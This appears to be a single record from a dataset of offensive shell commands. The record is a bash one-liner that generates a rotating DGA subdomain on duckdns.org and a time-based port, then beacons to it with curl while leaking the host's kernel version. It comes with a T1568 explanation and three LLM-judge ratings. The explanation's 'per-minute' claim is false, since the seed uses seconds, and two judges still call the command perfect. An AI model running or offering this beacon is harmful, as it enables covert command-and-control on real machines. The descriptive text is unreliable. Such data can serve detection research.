command: seed="$(date -u +%s)-$(hostname -s)"; sub=$(echo -n "$seed" | sha256sum | cut -c1-20); dom="$sub.duckdns.org"; port=$(( ( $(date -u +%s) / 60 % 40000 ) + 2000 )); curl -H "X-ESXi: $(uname -r)" --connect-timeout 5 "https://$dom:$port/ping"
explanation: Generates a per-minute rotating DGA subdomain using epoch seconds and hostname, then calculates a time-based port for the curl beacon. This is dynamic resolution aligned with T1568.
rationale_steps: Create a per-minute seed from epoch time and hostname.
Hash to produce a new subdomain each minute.
Compute a port from the current minute window.
Send a curl request to the generated domain and port.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper quoting, variable assignments, command substitutions, arithmetic operations, and valid curl flags.
llm_judgments.semantic_justification: The command perfectly implements T1568 (Dynamic Resolution) by generating a time-based DGA subdomain with hostname entropy, calculating a rotating port number, and establishing a beacon connection that would evade static blocking.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, valid flags, correct command separators, and no discernible syntax errors for a Bash environment.
llm_judgments.semantic_justification: The command perfectly aligns with T1568 by generating highly dynamic domain and port endpoints at runtime for beaconing, utilizing a DGA subdomain, a legitimate dynamic DNS service, and time-based port calculation.

llm_judgments.syntactic_justification: Balanced quoting and command substitutions with proper separators and flags; arithmetic and variable expansions are well-formed.
llm_judgments.semantic_justification: It generates a DGA-style subdomain and time-based port then beacons with curl, aligning with T1568, though the domain rotates per second (not per minute) and assumes resolvable DuckDNS entries.
